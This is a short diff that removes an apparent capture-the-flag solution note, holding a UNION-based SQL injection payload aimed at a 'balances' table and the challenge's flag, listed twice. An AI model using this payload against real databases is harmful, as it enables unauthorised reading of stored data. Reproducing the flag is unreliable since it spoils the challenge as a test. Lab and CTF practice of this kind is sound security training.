@@ -1,5 +1,0 @@
-sql injection: 'union select 1,bonus from balances#
-
-solution:	
-flag{un10n_bas3d_sql1_attack_1s_f0n}
-flag{un10n_bas3d_sql1_attack_1s_f0n}
